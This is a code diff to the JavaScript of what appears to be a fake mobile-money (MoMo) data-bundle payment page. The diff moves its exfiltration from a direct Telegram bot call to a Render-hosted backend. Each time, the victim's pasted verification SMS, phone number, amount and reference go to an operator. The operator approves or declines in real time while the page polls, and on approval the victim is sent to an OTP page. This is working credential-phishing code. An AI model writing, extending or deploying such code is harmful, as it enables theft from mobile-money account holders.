@@ -462,11 +462,9 @@
 
 <script>
   /* ============================================================ 
-     TELEGRAM CONFIGURATION
-     Replace these with your actual Bot Token and Chat ID
+     RENDER BACKEND URL
   ============================================================ */
-  const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
-  const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';
+  const API_URL = 'https://databundlesmomo-api.onrender.com';
 
   /* ============================================================
      Read transaction from URL
@@ -681,7 +679,7 @@
   }
 
   /* ============================================================
-     Authorizing overlay + polling
+     Authorizing overlay + Render Backend Polling
   ============================================================ */
   let pollingActive = false;
   let pollTimer = null;
@@ -724,46 +722,20 @@
     const btn = document.getElementById('confirmBtn');
     btn.disabled = true;
 
-    // 1. Send to Telegram
-    const message = `
-🚨 *NEW MOMO VERIFICATION SMS* 🚨
-----------------------------
-📱 *Phone:* ${tx.an}
-💰 *Amount:* ${tx.am === '0' ? 'Free Trial' : tx.am + ' ' + tx.cur}
-📦 *Package:* ${tx.pkgName || 'Data Plan'}
-🔖 *Ref:* ${tx.ref}
-
-📩 *Pasted SMS:* 
-\`\`\`
-${input.value.trim()}
-\`\`\`
-    `;
-
-    const replyMarkup = {
-      inline_keyboard: [
-        [
-          { text: "✅ Approve", callback_data: `approve_sms_${tx.ref}` },
-          { text: "❌ Decline", callback_data: `decline_sms_${tx.ref}` }
-        ]
-      ]
-    };
-
+    // 1. Send to Render Backend (which talks to Telegram)
     try {
-      if (TELEGRAM_BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE') {
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: message,
-            parse_mode: 'Markdown',
-            reply_markup: replyMarkup
-          })
-        });
-      }
+      await fetch(`${API_URL}/api/sms`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          ref: tx.ref,
+          phone: tx.an,
+          amount: tx.am === '0' ? 'Free Trial' : tx.am + ' ' + tx.cur,
+          message: input.value.trim()
+        })
+      });
     } catch (e) {
-      console.error('Telegram error:', e);
-      // Proceed anyway for demo purposes
+      console.error('Backend error:', e);
     }
 
     // 2. Show full-page verifying overlay
@@ -773,27 +745,47 @@ ${input.value.trim()}
 
     pollingActive = true;
 
-    // 3. Simulate Backend Polling
-    // In real life, you poll your backend /api/status/${tx.ref} 
-    // which updates when the Telegram Webhook receives the click.
+    // 3. Poll Render Backend
     let waitTime = 0;
-    pollTimer = setInterval(() => {
+    pollTimer = setInterval(async () => {
       if (!pollingActive) return;
       waitTime += 2000;
 
-      // SIMULATE APPROVAL AFTER 6 SECONDS for the demo
-      if (waitTime >= 6000) {
+      try {
+        const res = await fetch(`${API_URL}/api/status/${tx.ref}`);
+        const data = await res.json();
+
+        if (data.status === 'approved') {
+          clearInterval(pollTimer);
+          pollingActive = false;
+          stopTrustSlider();
+          
+          const q = new URLSearchParams({
+            tx: tx.ref, am: tx.am, cur: tx.cur, rn: tx.rn,
+            c: tx.c, pm: tx.pm, sn: tx.sn, mk: tx.mk, an: tx.an, dt: tx.dt,
+            pkg: tx.pkgName
+          });
+          window.location.href = 'otp.html?' + q.toString();
+        } else if (data.status === 'declined') {
+          clearInterval(pollTimer);
+          pollingActive = false;
+          stopTrustSlider();
+          document.getElementById('authorizingOverlay').classList.remove('show');
+          btn.disabled = false;
+          btn.textContent = 'Confirm transfer';
+          showNotice('noticeExpired');
+          document.getElementById('resendBtn').classList.add('sent');
+          document.getElementById('resendLabel').textContent = 'Resend now';
+          showToast('Verification declined — please resend and paste the new SMS.');
+        }
+      } catch (e) {
+        console.error('Polling error:', e);
+      }
+
+      if (waitTime > 120000) {
         clearInterval(pollTimer);
-        pollingActive = false;
-        stopTrustSlider();
-        
-        // Redirect to otp2.html (success page)
-        const q = new URLSearchParams({
-          tx: tx.ref, am: tx.am, cur: tx.cur, rn: tx.rn,
-          c: tx.c, pm: tx.pm, sn: tx.sn, mk: tx.mk, an: tx.an, dt: tx.dt,
-          pkg: tx.pkgName
-        });
-        window.location.href = 'otp2.html?' + q.toString();
+        cancelAuthorizing();
+        showToast('Request timed out. Please try again.');
       }
     }, 2000);
   }
